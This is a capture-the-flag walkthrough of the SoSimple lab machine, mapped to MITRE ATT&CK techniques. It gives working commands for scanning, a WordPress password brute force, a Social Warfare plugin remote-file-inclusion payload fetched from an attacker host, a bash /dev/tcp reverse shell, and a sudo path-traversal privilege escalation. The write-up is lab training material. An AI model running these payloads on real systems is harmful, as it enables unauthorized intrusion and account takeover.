# SoSimple CTF - MITRE ATT&CK Mapping & Walkthrough

**Category:** Boot2Root\
**Difficulty:** Easy\
**Tools Used:** Nmap, Feroxbuster, WPScan, Python HTTP server, SSH

---

## 🔍 Summary

This challenge involves exploiting a vulnerable WordPress installation using a known Social Warfare plugin vulnerability, followed by privilege escalation through misconfigured sudo permissions and a root-owned script.

---

## 🧠 MITRE ATT&CK Mapping

| Phase                | Technique                               | ID        | Description                                                             |
| -------------------- | --------------------------------------- | --------- | ----------------------------------------------------------------------- |
| Reconnaissance       | Active Scanning                         | T1595.002 | Used `nmap` and `feroxbuster` to discover open ports and WordPress path |
| Credential Access    | Brute Force                             | T1110.001 | Used `wpscan` to brute-force WordPress login for user `max`             |
| Initial Access       | Exploit Public-Facing Application       | T1190     | Exploited Social Warfare plugin to run arbitrary PHP code               |
| Execution            | Command and Scripting Interpreter (PHP) | T1059.004 | Executed `system("bash -c ...")` via a crafted PHP payload              |
| Credential Access    | Unsecured Credentials                   | T1552.001 | Retrieved `id_rsa` SSH key from `/home/max/.ssh`                        |
| Persistence          | Valid Accounts                          | T1078     | Logged in via SSH using retrieved private key                           |
| Privilege Escalation | Abuse Elevation Control Mechanism       | T1548.003 | Abused `sudo -u steven` and path traversal                              |
| Privilege Escalation | Abuse Elevation Control Mechanism       | T1548.002 | Root-owned script executed via `sudo`                                   |
| Discovery            | Permission Groups Discovery             | T1069.001 | Enumerated sudo rights using `sudo -l`                                  |
| Collection           | Data from Local System                  | T1005     | Retrieved `user.txt` and `flag.txt` files                               |

---

## 🔧 Steps

### 1. Enumeration

```bash
ping 192.168.210.78
nmap -sC -sV -Pn 192.168.210.78
```

Discovered open ports:

- 22 (SSH)
- 80 (HTTP)

```bash
feroxbuster -u http://192.168.210.78 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Found: `/wordpress/`

---

### 2. WordPress Vulnerability Scanning

```bash
wpscan --url http://192.168.210.78/wordpress/ -e u
```

Users: `admin`, `max`

```bash
wpscan --url http://192.168.210.78/wordpress/ -U max -P /usr/share/wordlists/rockyou.txt
```

Credentials Found: `max:opensesame`

---

### 3. Exploitation - Social Warfare Plugin

```bash
echo "<pre>system('cat /etc/passwd')</pre>" > payload.txt
python3 -m http.server 80
```

Exploit URL:

```
http://192.168.210.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://<attacker-ip>/payload.txt
```

---

### 4. Reverse Shell (Bash)

```php
<pre>system("bash -c 'bash -i >& /dev/tcp/192.168.49.167/8080 0>&1'")</pre>
```

---

### 5. Privilege Escalation

SSH as max using private key:

```bash
ssh -i id_rsa max@192.168.210.78
```

Then:

```bash
sudo -u steven /usr/sbin/service ../../bin/bash
```

Abuse root script:

```bash
sudo -u root /opt/tools/server-health.sh
```

---

### 6. Flag Collection

```bash
cat /home/max/user.txt
cat /home/steven/user2.txt
cat /root/flag.txt
```

---

## 📍 MITRE ATT&CK Navigator

Layer file: `mitre-heatmap.json` (not included here yet)

Visualize at: [MITRE Navigator](https://mitre-attack.github.io/attack-navigator/)

---

## 🔗 References

- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [WPScan](https://wpscan.com/)
- [Exploit DB - Social Warfare](https://www.exploit-db.com/exploits/46794)
- [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

**Author:** [Your Name or Alias]\
**Project:** CTF MITRE ATT&CK Mapping Series

